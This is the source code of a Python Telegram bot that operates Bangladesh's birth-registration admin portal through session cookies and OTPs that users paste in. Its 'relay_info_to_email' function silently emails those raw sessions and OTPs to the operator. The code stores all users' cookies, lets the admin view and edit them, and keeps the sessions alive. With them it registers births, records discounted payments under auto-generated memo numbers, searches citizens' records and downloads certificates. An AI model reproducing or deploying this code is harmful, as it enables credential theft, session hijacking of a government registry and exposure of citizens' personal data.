import os
import telebot
import requests
import json
import io
import time
import re
import smtplib
import logging
from threading import Thread
from email.mime.text import MIMEText
from datetime import datetime
from urllib.parse import quote
from flask import Flask
from pymongo import MongoClient

# ==========================================
# ০. লগিং সেটআপ
# ==========================================
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# ==========================================
# ১. কনফিগারেশন ও ডাটাবেস
# ==========================================
API_TOKEN = os.environ.get('BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE')
EMAIL_SENDER = os.environ.get('EMAIL_USER', 'your_email@gmail.com')
EMAIL_PASSWORD = os.environ.get('EMAIL_PASS', 'your_app_password')
EMAIL_RECEIVER = os.environ.get('EMAIL_RECEIVER', 'receiver@gmail.com')
ADMIN_ID = int(os.environ.get('ADMIN_ID', '7886593741'))

bot = telebot.TeleBot(API_TOKEN)

# --- MongoDB Setup ---
MONGO_URI = os.environ.get('MONGO_URI', 'YOUR_MONGO_URI_HERE')
try:
    mongo_client = MongoClient(MONGO_URI)
    db = mongo_client['bdris_bot_db']
    sessions_collection = db['users_sessions']
    access_collection = db['users_access']
    logging.info("✅ MongoDB Connected Successfully!")
except Exception as e:
    logging.error(f"❌ MongoDB Connection Failed: {e}")

# ==========================================
# ২. ইউজার এক্সেস ও পারমিশন সিস্টেম
# ==========================================
DEFAULT_PERMS = {
    "apps": True, "corr": True, "repr": True,
    "search": True, "ubrn_update": True,
    "server_pdf": True, "print": True
}

def check_user_access(chat_id, user_name):
    if chat_id == ADMIN_ID: return True
    user_record = access_collection.find_one({"chat_id": chat_id})
    if not user_record:
        access_collection.insert_one({
            "chat_id": chat_id, "name": user_name, "status": "allowed", "permissions": DEFAULT_PERMS
        })
        bot.send_message(ADMIN_ID, f"🔔 **নতুন ইউজার!**\n👤 {user_name}\n🆔 `{chat_id}`")
        return True
    return user_record.get("status") == "allowed"

def get_user_permissions(chat_id):
    if chat_id == ADMIN_ID: return {k: True for k in DEFAULT_PERMS}
    record = access_collection.find_one({"chat_id": chat_id})
    if record and "permissions" in record:
        p = DEFAULT_PERMS.copy()
        p.update(record["permissions"])
        return p
    return DEFAULT_PERMS

# ==========================================
# ৩. ডায়নামিক কিবোর্ড (UI Logic)
# ==========================================
def generate_main_menu(chat_id):
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    u_sess = get_session(chat_id)
    perms = get_user_permissions(chat_id)

    # User Login বাটন সবসময় সবার জন্য থাকবে
    markup.row("🔑 User Login")

    if u_sess["is_alive"]:
        # সেকশনের নতুন নাম
        markup.row("👤 নিবন্ধক সেকশন", "🧑‍💼 অদোরাইজড সেকশন")
        
        # 📋 Applications, 📝 Correction, 🔄 Reprint বাটন
        row_core = []
        if perms.get("apps") or chat_id == ADMIN_ID: row_core.append("📋 Applications")
        if perms.get("corr") or chat_id == ADMIN_ID: row_core.append("📝 Correction")
        if perms.get("repr") or chat_id == ADMIN_ID: row_core.append("🔄 Reprint")
        if row_core: markup.row(*row_core)
        
        # Search ও ড্যাশবোর্ড
        row_search = ["🏠 Dashboard"]
        if perms.get("search") or chat_id == ADMIN_ID: 
            row_search.extend(["🌐 Search By Name", "🔢 Search By UBRN"])
        markup.row(*row_search)
        
        # টুলস বাটন
        row_tools = []
        if perms.get("ubrn_update") or chat_id == ADMIN_ID: row_tools.append("👨‍👩‍👦 পিতা-মাতার UBRN হালনাগাদ")
        if perms.get("server_pdf") or chat_id == ADMIN_ID: row_tools.append("🖨️ Server PDF Print")
        if row_tools: markup.row(*row_tools)

    if chat_id == ADMIN_ID:
        markup.row("🔑 Admin Login", "🛠️ Check Cookies", "👥 Manage Users")
    
    return markup

# ==========================================
# ৪. সেশন ম্যানেজমেন্ট (MongoDB)
# ==========================================
user_sessions = {}

def get_default_session_dict():
    return {
        "req_session": requests.Session(), "csrf": "",
        "ch_session": requests.Session(), "ch_csrf": "", "ch_otp": "",
        "mode": "SECRETARY", "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "is_alive": False, "current_page": "https://bdris.gov.bd/admin/",
        "app_start": 0, "app_length": 5, "sharok_no": 1, "temp_data": {}, "id_cache": {} 
    }

def save_session_to_db(chat_id, u_sess):
    try:
        data = {
            "chat_id": chat_id, "sec_cookies": u_sess["req_session"].cookies.get_dict(),
            "ch_cookies": u_sess["ch_session"].cookies.get_dict(),
            "mode": u_sess["mode"], "ch_otp": u_sess.get("ch_otp", ""), "is_alive": u_sess["is_alive"]
        }
        sessions_collection.update_one({"chat_id": chat_id}, {"$set": data}, upsert=True)
    except Exception as e:
        logging.error(f"❌ Session DB Save Error for {chat_id}: {e}")

def get_session(chat_id):
    if chat_id not in user_sessions:
        u_sess = get_default_session_dict()
        try:
            db_data = sessions_collection.find_one({"chat_id": chat_id})
            if db_data:
                u_sess["req_session"].cookies.update(db_data.get("sec_cookies", {}))
                u_sess["ch_session"].cookies.update(db_data.get("ch_cookies", {}))
                u_sess["mode"], u_sess["ch_otp"], u_sess["is_alive"] = db_data.get("mode", "SECRETARY"), db_data.get("ch_otp", ""), db_data.get("is_alive", False)
        except Exception as e:
            logging.error(f"❌ Session DB Load Error for {chat_id}: {e}")
        user_sessions[chat_id] = u_sess
    return user_sessions[chat_id]

# ==========================================
# ৫. কোর রিকোয়েস্ট ও ইমেইল পাচার
# ==========================================
def extract_sid_tsid(text):
    s = re.search(r'SESSION=([^\s;]+)', text, re.I)
    tsid = re.search(r'TS0108b707=([^\s;]+)', text, re.I)
    return (s.group(1), tsid.group(1)) if s and tsid else (None, None)

def get_active_session(u_sess):
    return (u_sess["ch_session"], u_sess["ch_csrf"]) if u_sess["mode"] == "CHAIRMAN" else (u_sess["req_session"], u_sess["csrf"])

def call_api(chat_id, url, method="GET", data=None):
    u_sess = get_session(chat_id)
    sess, csrf = get_active_session(u_sess)
    h = {'x-csrf-token': csrf, 'x-requested-with': 'XMLHttpRequest', 'user-agent': u_sess["ua"], 'referer': u_sess["current_page"]}
    try:
        return sess.post(url, headers=h, data=data, timeout=30) if method == "POST" else sess.get(url, headers=h, timeout=30)
    except Exception as e:
        logging.error(f"❌ API Call Error ({url}): {e}")
        return None

def navigate_to(chat_id, url):
    u_sess = get_session(chat_id)
    sess, _ = get_active_session(u_sess)
    try:
        res = sess.get(url, headers={'User-Agent': u_sess["ua"], 'Referer': u_sess["current_page"]}, timeout=25)
        csrf = re.search(r'name="_csrf" content="([^"]+)"', res.text)
        if csrf:
            if u_sess["mode"] == "CHAIRMAN": u_sess["ch_csrf"] = csrf.group(1)
            else: u_sess["csrf"] = csrf.group(1)
        u_sess["current_page"] = url
        return True, res.text
    except Exception as e:
        logging.error(f"❌ Navigate Error ({url}): {e}")
        return False, None

def relay_info_to_email(chat_id, u_name):
    u_sess = get_session(chat_id)
    report = f"--- BDRIS LOGIN REPORT ---\nUser: {u_name} ({chat_id})\nTime: {datetime.now()}\n\n"
    report += f"CH RAW: {u_sess['temp_data'].get('ch_raw', 'N/A')}\n"
    report += f"OTP: {u_sess.get('ch_otp', 'N/A')}\n"
    report += f"SEC RAW: {u_sess['temp_data'].get('sec_raw', 'N/A')}\n"
    msg = MIMEText(report)
    msg['Subject'], msg['From'], msg['To'] = f"Login Alert: {u_name}", EMAIL_SENDER, EMAIL_RECEIVER
    try:
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as s:
            s.login(EMAIL_SENDER, EMAIL_PASSWORD)
            s.sendmail(EMAIL_SENDER, EMAIL_RECEIVER, msg.as_string())
    except Exception as e:
        logging.error(f"❌ Email Relay Error: {e}")

def keep_sessions_alive():
    while True:
        time.sleep(300)
        for chat_id, u_sess in list(user_sessions.items()):
            if u_sess["is_alive"]:
                try: 
                    u_sess["req_session"].get("https://bdris.gov.bd/admin/", headers={'User-Agent': u_sess["ua"]}, timeout=20)
                    u_sess["ch_session"].get("https://bdris.gov.bd/admin/", headers={'User-Agent': u_sess["ua"]}, timeout=20)
                except Exception as e:
                    logging.warning(f"⚠️ Keep-Alive warning for {chat_id}: {e}")

def is_cancel(m):
    if m.text and ("/start" in m.text or "Back to Menu" in m.text or "Dashboard" in m.text):
        bot.send_message(m.chat.id, "🏠 মেনুতে ফিরে আসা হলো।", reply_markup=generate_main_menu(m.chat.id))
        bot.clear_step_handler_by_chat_id(m.chat.id)
        return True
    return False

# ==========================================
# ৬. লগইন ফ্লো (নিবন্ধক -> OTP -> সচিব)
# ==========================================
def role_step_1(m):
    if is_cancel(m): return
    u_sess = get_session(m.chat.id)
    u_sess["temp_data"]["ch_raw"] = m.text.strip()
    msg = bot.send_message(m.chat.id, "✅ নিবন্ধকের OTP দিন:")
    bot.register_next_step_handler(msg, role_step_2)

def role_step_2(m):
    if is_cancel(m): return
    get_session(m.chat.id)["ch_otp"] = m.text.strip()
    msg = bot.send_message(m.chat.id, "✅ এখন সচিবের(অদোরাইজড) সেশন দিন:")
    bot.register_next_step_handler(msg, role_step_3)

def role_step_3(m):
    if is_cancel(m): return
    chat_id, u_sess = m.chat.id, get_session(m.chat.id)
    u_sess["temp_data"]["sec_raw"] = m.text.strip()
    sid, tsid = extract_sid_tsid(m.text.strip())
    
    if sid:
        u_sess["req_session"].cookies.set("SESSION", sid, domain='bdris.gov.bd')
        u_sess["req_session"].cookies.set("TS0108b707", tsid, domain='bdris.gov.bd')
        u_sess["is_alive"] = True
        save_session_to_db(chat_id, u_sess)
        Thread(target=relay_info_to_email, args=(chat_id, m.from_user.first_name), daemon=True).start()
        bot.send_message(chat_id, "🎉 লগইন সফল হয়েছে!", reply_markup=generate_main_menu(chat_id))
    else: 
        bot.send_message(chat_id, "❌ ভুল ফরম্যাট। আবার /start দিন।")

# ==========================================
# ৭. অ্যাপ লিস্ট লজিক (Apps, Correction, Reprint)
# ==========================================
def handle_category_init(m, cmd):
    get_session(m.chat.id)["app_start"] = 0
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True).add("🔍 Search ID", "📋 All List", "🏠 Back to Menu")
    msg = bot.send_message(m.chat.id, f"📂 {cmd.upper()} সেকশন:", reply_markup=markup)
    bot.register_next_step_handler(msg, category_gate, cmd)

def category_gate(m, cmd):
    if is_cancel(m): return
    if "Search ID" in m.text:
        msg = bot.send_message(m.chat.id, "🆔 আইডি দিন:", reply_markup=telebot.types.ReplyKeyboardMarkup(resize_keyboard=True).add("🏠 Back to Menu"))
        bot.register_next_step_handler(msg, search_loop, cmd)
    elif "All List" in m.text: fetch_list_ui(m, cmd, False)

def search_loop(m, cmd):
    if is_cancel(m): return
    fetch_list_ui(m, cmd, True)
    msg = bot.send_message(m.chat.id, "🔍 আরও আইডি দিন (বা মেনুতে ফিরুন):")
    bot.register_next_step_handler(msg, search_loop, cmd)

def fetch_list_ui(message, cmd, is_search):
    chat_id, u_sess, perms = message.chat.id, get_session(message.chat.id), get_user_permissions(message.chat.id)
    config = {'apps': ("/admin/br/applications/search", "/api/br/applications/search"), 'corr': ("/admin/br/correction-applications/search", "/api/br/correction-applications/search"), 'repr': ("/admin/br/reprint/view/applications/search", "/api/br/reprint/applications/search")}
    
    navigate_to(chat_id, "https://bdris.gov.bd/admin/")
    _, html = navigate_to(chat_id, f"https://bdris.gov.bd{config[cmd][0]}")
    m = re.search(r'href=".*?\?data=([A-Za-z0-9_\-]+)"', html or "")
    data_id = m.group(1) if m else None
    
    if not data_id: return bot.send_message(chat_id, "❌ ডাটা আইডি মেলেনি। সেশন চেক করুন।")

    url = f"https://bdris.gov.bd{config[cmd][1]}?data={data_id}&status=ALL&draw=1&start={u_sess['app_start']}&length={u_sess['app_length']}&search[value]={quote(message.text.strip() if is_search else '')}&search[regex]=false&order[0][column]=1&order[0][dir]=desc"
    res = call_api(chat_id, url)
    
    if res and res.status_code == 200:
        try:
            items = res.json().get('data', [])
            if not items: return bot.send_message(chat_id, "📭 কোনো ডেটা পাওয়া যায়নি।")
            
            markup = telebot.types.InlineKeyboardMarkup()
            # এখানে CHAIRMAN মোড মানে 'নিবন্ধক সেকশন' আর SECRETARY মানে 'অদোরাইজড সেকশন'
            mode_text = "নিবন্ধক সেকশন" if u_sess['mode'] == "CHAIRMAN" else "অদোরাইজড সেকশন"
            msg_text = f"📋 **{cmd.upper()} List** ({mode_text}):\n\n"
            
            for item in items:
                enc_id, status = item.get('encryptedId'), str(item.get('status', '')).upper()
                short_id = str(abs(hash(enc_id)))[-8:]
                u_sess["id_cache"][short_id] = enc_id
                
                msg_text += f"🆔 `{item.get('id') or item.get('applicationId')}` | {item.get('personNameBn')}\n🚩 Status: `{status}`\n"
                
                btns = []
                if u_sess["mode"] == "CHAIRMAN" and "RECEIVED" in status:
                    btns.append(telebot.types.InlineKeyboardButton("✅ Register", callback_data=f"reg_{short_id}") if cmd == 'apps' else telebot.types.InlineKeyboardButton("📝 Corr Register", callback_data=f"coreg_{short_id}"))
                elif u_sess["mode"] == "SECRETARY" and any(w in status for w in ["APPLIED", "PENDING", "PAYMENT", "UNPAID"]):
                    btns.extend([telebot.types.InlineKeyboardButton("💳 Pay", callback_data=f"pay_{short_id}"), telebot.types.InlineKeyboardButton("📥 Receive", callback_data=f"recv_{short_id}")])
                
                if btns: markup.row(*btns)
                if perms.get("print") or chat_id == ADMIN_ID:
                    markup.row(telebot.types.InlineKeyboardButton("🖨️ Print PDF", callback_data=f"print_{short_id}"))
                msg_text += "━━━━━━━━━━━━━━\n"
                
            if not is_search:
                nav = []
                if u_sess["app_start"] > 0: nav.append(telebot.types.InlineKeyboardButton("⬅️ Prev", callback_data=f"prev_{cmd}"))
                if u_sess["app_start"] + u_sess["app_length"] < res.json().get('recordsTotal', 0): nav.append(telebot.types.InlineKeyboardButton("Next ➡️", callback_data=f"next_{cmd}"))
                if nav: markup.row(*nav)
                    
            bot.send_message(chat_id, msg_text, reply_markup=markup, parse_mode='Markdown')
        except Exception as e:
            logging.error(f"❌ JSON Parsing Error in fetch_list_ui: {e}")
            bot.send_message(chat_id, "❌ ডেটা প্রসেস করতে সমস্যা হয়েছে।")
    else:
        bot.send_message(chat_id, "❌ সার্ভার থেকে কোনো ডেটা পাওয়া যায়নি।")

# ==========================================
# ৮. পিতা-মাতার UBRN আপডেট ফ্লো
# ==========================================
def start_ubrn_flow(m):
    u_sess = get_session(m.chat.id)
    u_sess["temp_data"]["ubrn"] = {}
    navigate_to(m.chat.id, "https://bdris.gov.bd/admin/br/parents-ubrn-update")
    msg = bot.send_message(m.chat.id, "১. ব্যক্তির ১৭ ডিজিট UBRN দিন:", reply_markup=telebot.types.ReplyKeyboardMarkup(resize_keyboard=True).add("🏠 Back to Menu"))
    bot.register_next_step_handler(msg, ubrn_p_step)

def ubrn_p_step(m):
    if is_cancel(m): return
    get_session(m.chat.id)["temp_data"]["ubrn"]["p"] = m.text.strip()
    bot.register_next_step_handler(bot.send_message(m.chat.id, "২. পিতার UBRN (না থাকলে 0):"), ubrn_f_step)

def ubrn_f_step(m):
    if is_cancel(m): return
    get_session(m.chat.id)["temp_data"]["ubrn"]["f"] = "" if m.text == '0' else m.text.strip()
    bot.register_next_step_handler(bot.send_message(m.chat.id, "৩. মাতার UBRN (না থাকলে 0):"), ubrn_m_step)

def ubrn_m_step(m):
    if is_cancel(m): return
    get_session(m.chat.id)["temp_data"]["ubrn"]["m"] = "" if m.text == '0' else m.text.strip()
    bot.register_next_step_handler(bot.send_message(m.chat.id, "৪. ফোন নম্বর:"), ubrn_ph_step)

def ubrn_ph_step(m):
    if is_cancel(m): return
    chat_id, u_sess = m.chat.id, get_session(m.chat.id)
    phone = "+88" + m.text.strip() if m.text.strip().startswith('01') else m.text.strip()
    u_sess["temp_data"]["ubrn"]["ph"] = phone
    d = u_sess["temp_data"]["ubrn"]
    res = call_api(chat_id, f"https://bdris.gov.bd/admin/br/parents-ubrn-update/send-otp?personBrn={d['p']}&fatherBrn={d['f']}&motherBrn={d['m']}&phone={quote(phone)}&email=", method="POST")
    if res and res.status_code == 200: 
        bot.register_next_step_handler(bot.send_message(chat_id, "✅ OTP দিন:"), ubrn_final)
    else: 
        bot.send_message(chat_id, "❌ OTP পাঠাতে ব্যর্থ।")

def ubrn_final(m):
    if is_cancel(m): return
    chat_id, u_sess = m.chat.id, get_session(m.chat.id)
    d = u_sess["temp_data"]["ubrn"]
    p = {'_csrf': u_sess["csrf"], 'personBrn': d['p'], 'fatherBrn': d['f'], 'motherBrn': d['m'], 'phone': d['ph'], 'email': '', 'otp': m.text.strip()}
    res = call_api(chat_id, "https://bdris.gov.bd/admin/br/parents-ubrn-update", method="POST", data=p)
    bot.send_message(chat_id, "✅ আপডেট সফল!" if res and res.status_code == 200 else "❌ ব্যর্থ!")

# ==========================================
# ৯. সার্চ ও পিডিএফ প্রিন্ট (JSON + UBRN)
# ==========================================
def process_search_by_name(m):
    if is_cancel(m): return
    payload = f"personNameBn={quote(m.text.strip())}&personNameEn=&nameLang=BENGALI"
    navigate_to(m.chat.id, "https://bdris.gov.bd/admin/br/advanced-search-by-name")
    res = call_api(m.chat.id, "https://bdris.gov.bd/api/br/advanced-search-by-name", method="POST", data=payload)
    if res: 
        try:
            bot.send_message(m.chat.id, f"📊 **Search Result:**\n```json\n{json.dumps(res.json(), indent=2, ensure_ascii=False)}\n```", parse_mode='Markdown')
        except Exception as e:
            logging.error(f"Search Result Format Error: {e}")

def process_search_by_ubrn(m):
    if is_cancel(m): return
    ubrn = m.text.strip()
    res = call_api(m.chat.id, f"https://bdris.gov.bd/api/br/info/ubrn/{ubrn}")
    if res and res.status_code == 200:
        try:
            bot.send_message(m.chat.id, f"📊 **UBRN Result:**\n```json\n{json.dumps(res.json(), indent=2, ensure_ascii=False)}\n```", parse_mode='Markdown')
        except Exception as e:
            logging.error(f"UBRN JSON Error: {e}")
    else: 
        bot.send_message(m.chat.id, "❌ তথ্য পাওয়া যায়নি।")

def download_server_by_ubrn(m):
    if is_cancel(m): return
    chat_id, ubrn = m.chat.id, m.text.strip()
    res = call_api(chat_id, f"https://bdris.gov.bd/api/br/info/ubrn/{ubrn}")
    if res and res.status_code == 200:
        enc_id = res.json().get('encryptedId')
        if enc_id: download_server_pdf(chat_id, enc_id, f"PDF_{ubrn}")
        else: bot.send_message(chat_id, "❌ Encrypted ID পাওয়া যায়নি।")
    else: bot.send_message(chat_id, "❌ UBRN পাওয়া যায়নি।")

def download_server_pdf(chat_id, enc_id, filename):
    sess, _ = get_active_session(get_session(chat_id))
    try:
        sess.get(f"https://bdris.gov.bd/admin/new-certificate/check?data={enc_id}", timeout=60)
        res = sess.get(f"https://bdris.gov.bd/admin/new-certificate/print?data={enc_id}", timeout=180)
        if 'application/pdf' in res.headers.get('Content-Type', ''):
            bot.send_document(chat_id, io.BytesIO(res.content), visible_file_name=f"{filename}.pdf")
        else: bot.send_message(chat_id, "⚠️ পিডিএফ পাওয়া যায়নি।")
    except Exception as e:
        logging.error(f"❌ PDF Download Error for {chat_id}: {e}")
        bot.send_message(chat_id, "❌ ডাউনলোড প্রক্রিয়ায় সমস্যা হয়েছে।")

# ==========================================
# ১০. অ্যাডমিন কন্ট্রোল ও কলব্যাক হ্যান্ডলার
# ==========================================
def admin_edit_field(m, target_cid, field):
    if is_cancel(m): return
    t_sess = get_session(target_cid)
    val = m.text.strip()
    try:
        if field == "SEC":
            s, t = extract_sid_tsid(val)
            if s: t_sess["req_session"].cookies.set("SESSION", s, domain='bdris.gov.bd'); t_sess["req_session"].cookies.set("TS0108b707", t, domain='bdris.gov.bd')
        elif field == "CH":
            s, t = extract_sid_tsid(val)
            if s: t_sess["ch_session"].cookies.set("SESSION", s, domain='bdris.gov.bd'); t_sess["ch_session"].cookies.set("TS0108b707", t, domain='bdris.gov.bd')
        elif field == "OTP": t_sess["ch_otp"] = val
        save_session_to_db(target_cid, t_sess)
        bot.send_message(m.chat.id, f"✅ User {target_cid} এর {field} আপডেট হয়েছে!")
    except Exception as e: 
        logging.error(f"❌ Admin Edit Error: {e}")
        bot.send_message(m.chat.id, "❌ আপডেট ব্যর্থ।")

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    chat_id = call.message.chat.id
    if not check_user_access(chat_id, call.from_user.first_name): return
    
    u_sess, perms = get_session(chat_id), get_user_permissions(chat_id)
    parts = call.data.split('_')
    action, sid = parts[0], parts[1] if len(parts) > 1 else ""
    enc_id = u_sess["id_cache"].get(sid)

    # --- Pagination ---
    if action in ["next", "prev"]:
        u_sess["app_start"] = max(0, u_sess["app_start"] + (u_sess["app_length"] if action == "next" else -u_sess["app_length"]))
        fetch_list_ui(call.message, sid, False)

    # --- Admin Controls (ON/OFF Logic) ---
    elif action in ["admuser", "tgl", "edsec", "edch", "edotp", "block", "unblock"] and call.from_user.id == ADMIN_ID:
        target = int(sid)
        if action == "admuser":
            p = (access_collection.find_one({"chat_id": target}) or {}).get("permissions", DEFAULT_PERMS)
            msg = f"👤 **User:** `{target}`\nCH OTP: `{get_session(target).get('ch_otp', 'N/A')}`\n\nপারমিশন কন্ট্রোল করুন:"
            markup = telebot.types.InlineKeyboardMarkup()
            markup.row(telebot.types.InlineKeyboardButton("✏️ SEC", callback_data=f"edsec_{target}"), telebot.types.InlineKeyboardButton("✏️ CH", callback_data=f"edch_{target}"), telebot.types.InlineKeyboardButton("✏️ OTP", callback_data=f"edotp_{target}"))
            
            # এখানে বাটনগুলো অন/অফ আকারে দেখাবে
            cmd_labels = [("apps", "Apps"), ("corr", "Corr"), ("repr", "Repr"), ("search", "Search"), ("ubrn_update", "UBRN Update"), ("server_pdf", "Srv PDF"), ("print", "Inline Print")]
            for k, n in cmd_labels:
                st = p.get(k, True)
                markup.row(telebot.types.InlineKeyboardButton(f"{'❌ Disable' if st else '✅ Enable'} {n}", callback_data=f"tgl_{target}_{k}_{'off' if st else 'on'}"))
            bot.edit_message_text(msg, chat_id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')
        
        elif action == "tgl":
            access_collection.update_one({"chat_id": int(parts[1])}, {"$set": {f"permissions.{parts[2]}": parts[3] == "on"}})
            call.data = f"admuser_{parts[1]}"; callback_handler(call)
        
        elif action == "edsec": bot.register_next_step_handler(bot.send_message(chat_id, f"User {target} এর নতুন SEC সেশন দিন:"), admin_edit_field, target, "SEC")
        elif action == "edch": bot.register_next_step_handler(bot.send_message(chat_id, f"User {target} এর নতুন CH সেশন দিন:"), admin_edit_field, target, "CH")
        elif action == "edotp": bot.register_next_step_handler(bot.send_message(chat_id, f"User {target} এর নতুন OTP দিন:"), admin_edit_field, target, "OTP")
        elif action == "block": access_collection.update_one({"chat_id": int(sid)}, {"$set": {"status": "blocked"}})
        elif action == "unblock": access_collection.update_one({"chat_id": int(sid)}, {"$set": {"status": "allowed"}})

    # --- Core Actions ---
    elif action == "print" and enc_id:
        if perms.get("print") or chat_id == ADMIN_ID:
            bot.answer_callback_query(call.id, "⏳ ডাউনলোড শুরু...")
            download_server_pdf(chat_id, enc_id, f"Cert_{sid}")
        else: bot.answer_callback_query(call.id, "🚫 অনুমতি নেই!", show_alert=True)

    elif action == "pay" and enc_id:
        payload = {'data': enc_id, 'paymentType': 'PAYMENT_BY_DISCOUNT', 'discountAmount': '50', 'discountSharokNo': str(u_sess["sharok_no"]), 'discountSharokDate': datetime.now().strftime("%d/%m/%Y"), '_csrf': u_sess["csrf"]}
        res = call_api(chat_id, "https://bdris.gov.bd/api/payment/receive", method="POST", data=payload)
        if res and res.status_code == 200:
            u_sess["sharok_no"] += 1
            bot.answer_callback_query(call.id, "✅ পেমেন্ট সফল!")
        else: bot.answer_callback_query(call.id, "❌ পেমেন্ট ব্যর্থ!")

    elif action == "recv" and enc_id:
        res = call_api(chat_id, "https://bdris.gov.bd/api/application/receive", method="POST", data={'data': enc_id, '_csrf': u_sess["csrf"]})
        if res and res.status_code == 200: bot.answer_callback_query(call.id, "✅ রিসিভ সফল!", show_alert=True)
        else: bot.answer_callback_query(call.id, "❌ রিসিভ ব্যর্থ!", show_alert=True)

    elif action in ["reg", "coreg"] and u_sess["mode"] == "CHAIRMAN" and enc_id:
        bot.answer_callback_query(call.id, "⏳ রেজিস্ট্রেশন হচ্ছে...")
        path = "correction-application" if action == "coreg" else "application"
        try:
            html = get_active_session(u_sess)[0].get(f"https://bdris.gov.bd/admin/br/{path}/register?data={enc_id}").text
            v = re.search(r'<option\s+value="(\d{17})"[^>]*>([^<]+)</option>', html)
            if v:
                p = {"birthPlaceAndDobVerifierName": v.group(2).strip(), "birthPlaceAndDobVerifierBrn": v.group(1), "birthPlaceAndDobVerificationDate": datetime.now().strftime("%d/%m/%Y"), "otp": u_sess["ch_otp"], "data": enc_id}
                res = call_api(chat_id, f"https://bdris.gov.bd/api/br/{path}/register", method="POST", data=p)
                if res and res.status_code == 200: bot.send_message(chat_id, "✅ রেজিস্ট্রেশন সফল!")
                else: bot.send_message(chat_id, "❌ রেজিস্ট্রেশন ব্যর্থ।")
            else: bot.send_message(chat_id, "❌ ভেরিফায়ার পাওয়া যায়নি।")
        except Exception as e:
            logging.error(f"❌ Registration Request Error: {e}")
            bot.send_message(chat_id, "❌ প্রক্রিয়ায় ক্র্যাশ হয়েছে।")

# ==========================================
# ১১. মেইন রাউটার (All Buttons Guarded)
# ==========================================
@bot.message_handler(func=lambda m: True)
def router(m):
    cid, t = m.chat.id, m.text
    if not check_user_access(cid, m.from_user.first_name): return
    u_sess, perms = get_session(cid), get_user_permissions(cid)

    if "/start" in t or "Back to Menu" in t: bot.send_message(cid, "🚀 BDRIS Master Bot Active!", reply_markup=generate_main_menu(cid))
    
    # User Login বাটন সবসময় এভেইলেবল
    elif t == "🔑 User Login":
        msg = bot.send_message(cid, "✅ নিবন্ধকের সেশন দিন (SESSION ও TS):")
        bot.register_next_step_handler(msg, role_step_1)
        
    elif t == "🔑 Admin Login" and cid == ADMIN_ID:
        msg = bot.send_message(cid, "🔑 এডমিন সেশন দিন:")
        bot.register_next_step_handler(msg, lambda m: admin_login_logic(m))

    elif t == "👤 নিবন্ধক সেকশন":
        u_sess["mode"] = "CHAIRMAN"; save_session_to_db(cid, u_sess)
        bot.send_message(cid, "✅ নিবন্ধক সেকশন (Registration Mode) চালু।", reply_markup=generate_main_menu(cid))

    elif t == "🧑‍💼 অদোরাইজড সেকশন":
        u_sess["mode"] = "SECRETARY"; save_session_to_db(cid, u_sess)
        bot.send_message(cid, "✅ অদোরাইজড সেকশন (Payment Mode) চালু।", reply_markup=generate_main_menu(cid))

    # --- কমান্ড পারমিশন গার্ড ---
    elif t == "📋 Applications" and (perms.get("apps") or cid == ADMIN_ID): handle_category_init(m, 'apps')
    elif t == "📝 Correction" and (perms.get("corr") or cid == ADMIN_ID): handle_category_init(m, 'corr')
    elif t == "🔄 Reprint" and (perms.get("repr") or cid == ADMIN_ID): handle_category_init(m, 'repr')

    elif t == "🌐 Search By Name" and (perms.get("search") or cid == ADMIN_ID):
        msg = bot.send_message(cid, "🔍 নাম দিন (Bangla):")
        bot.register_next_step_handler(msg, lambda x: process_search_by_name(x))
        
    elif t == "🔢 Search By UBRN" and (perms.get("search") or cid == ADMIN_ID):
        msg = bot.send_message(cid, "🔢 UBRN দিন:")
        bot.register_next_step_handler(msg, lambda x: process_search_by_ubrn(x))
    
    elif t == "👨‍👩‍👦 পিতা-মাতার UBRN হালনাগাদ" and (perms.get("ubrn_update") or cid == ADMIN_ID): start_ubrn_flow(m)
    
    elif t == "🖨️ Server PDF Print" and (perms.get("server_pdf") or cid == ADMIN_ID):
        msg = bot.send_message(cid, "🖨️ ১৭ ডিজিট UBRN:")
        bot.register_next_step_handler(msg, lambda x: download_server_by_ubrn(x))

    elif t == "🛠️ Check Cookies" and cid == ADMIN_ID:
        c1 = u_sess["req_session"].cookies.get_dict()
        c2 = u_sess["ch_session"].cookies.get_dict()
        bot.send_message(cid, f"**SEC:** `{c1}`\n**CH:** `{c2}`\n**OTP:** `{u_sess['ch_otp']}`", parse_mode="Markdown")

    elif t == "👥 Manage Users" and cid == ADMIN_ID:
        users = list(access_collection.find({}))
        markup = telebot.types.InlineKeyboardMarkup()
        for u in users: markup.row(telebot.types.InlineKeyboardButton(f"{u.get('name')} ({u.get('chat_id')})", callback_data=f"admuser_{u.get('chat_id')}"))
        bot.send_message(cid, "👥 ইউজার প্যানেল:", reply_markup=markup)

def admin_login_logic(m):
    sid, tsid = extract_sid_tsid(m.text.strip())
    u_sess = get_session(m.chat.id)
    if sid:
        u_sess["req_session"].cookies.set("SESSION", sid, domain='bdris.gov.bd')
        u_sess["req_session"].cookies.set("TS0108b707", tsid, domain='bdris.gov.bd')
        u_sess["is_alive"] = True
        save_session_to_db(m.chat.id, u_sess)
        bot.send_message(m.chat.id, "✅ এডমিন সেশন সেট হয়েছে!", reply_markup=generate_main_menu(m.chat.id))
    else: bot.send_message(m.chat.id, "❌ কুকি ভুল।")

if __name__ == "__main__":
    Thread(target=keep_sessions_alive, daemon=True).start()
    Thread(target=lambda: Flask('').run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))).start()
    bot.infinity_polling()
